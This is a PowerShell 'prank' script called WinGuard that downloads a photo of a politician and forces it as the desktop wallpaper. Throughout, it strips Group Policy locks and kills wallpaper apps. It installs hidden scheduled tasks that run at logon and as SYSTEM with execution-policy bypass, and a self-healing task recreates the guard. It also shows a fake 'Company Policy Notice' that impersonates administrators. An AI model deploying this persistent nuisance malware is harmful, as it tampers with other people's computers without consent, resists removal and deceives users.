# ===== CONFIG =====
$wallpaperUrl = "https://groundviews.org/wp-content/uploads/2014/11/20141121-afp-MaithripalaSirisena.jpg"
$base = "$env:ProgramData\WinGuard"
$guard = "$base\guard.ps1"
$heal = "$base\heal.ps1"
$notice = "$base\notice.ps1"
$image = "$base\wallpaper.jpg"
$backup = "$base\backup.txt"

New-Item $base -ItemType Directory -Force | Out-Null

# ===== REMOVE EXISTING GROUP POLICY LOCKS =====
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Name NoChangingWallpaper -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name Wallpaper -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Name NoChangingWallpaper -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name Wallpaper -ErrorAction SilentlyContinue

# ===== BACKUP CURRENT WALLPAPER =====
try {
    (Get-ItemProperty "HKCU:\Control Panel\Desktop").Wallpaper | Out-File $backup -Force
} catch {}

# ===== DOWNLOAD IMAGE =====
Invoke-WebRequest $wallpaperUrl -OutFile $image -UseBasicParsing

# ===== APPLY WALLPAPER IMMEDIATELY =====
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
'@
Set-ItemProperty "HKCU:\Control Panel\Desktop" Wallpaper $image
Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle 2
Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper 0
# SPI_SETDESKWALLPAPER=0x0014, SPIF_UPDATEINIFILE=0x01, SPIF_SENDCHANGE=0x02
[Wallpaper]::SystemParametersInfo(0x0014, 0, $image, 0x01 -bor 0x02)
# Refresh Group Policy to ensure wallpaper setting takes effect immediately
gpupdate /force

# ===== GUARD SCRIPT =====
@"
`$img = '$image'

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
'@

while (`$true) {

    'Lively','WallpaperEngine','livelywpf','wallpaper32','wallpaper64' | ForEach-Object {
        Get-Process -Name `$_ -ErrorAction SilentlyContinue | Stop-Process -Force
    }

    Set-ItemProperty "HKCU:\Control Panel\Desktop" Wallpaper `$img
    Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle 2
    Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper 0
    # SPI_SETDESKWALLPAPER=0x0014, SPIF_UPDATEINIFILE=0x01, SPIF_SENDCHANGE=0x02
    [Wallpaper]::SystemParametersInfo(0x0014, 0, `$img, 0x01 -bor 0x02)

    # Lock wallpaper again using our own policy
    New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Force | Out-Null
    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" NoChangingWallpaper 1

    Start-Sleep 60
}
"@ | Out-File $guard -Encoding UTF8 -Force

# ===== SELF HEAL SCRIPT =====
@"
if (!(Get-ScheduledTask -TaskName WinGuard -ErrorAction SilentlyContinue)) {
    schtasks /create /tn WinGuard /sc onlogon /rl highest /tr `"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $guard`"
}
"@ | Out-File $heal -Encoding UTF8 -Force

# ===== PRANK MESSAGE =====
@"
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show(
"Your wallpaper is managed by company policy.`n`nThis device has been pranked by Sahindu 😄`n`nChanges are restricted by the system administrator.",
"Company Policy Notice",
"OK",
"Warning"
)
"@ | Out-File $notice -Encoding UTF8 -Force

# ===== TASKS =====
Register-ScheduledTask -TaskName "WinGuard" `
 -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $guard") `
 -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
 -RunLevel Highest -Force

$principalSys = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "WinGuard-Heal" `
 -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $heal") `
 -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) `
 -Principal $principalSys -Force

Register-ScheduledTask -TaskName "WinGuard-Notice" `
 -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $notice") `
 -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
 -RunLevel Highest -Force

# ===== START NOW =====
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File $guard"

Write-Host "WinGuard v2 installed successfully."
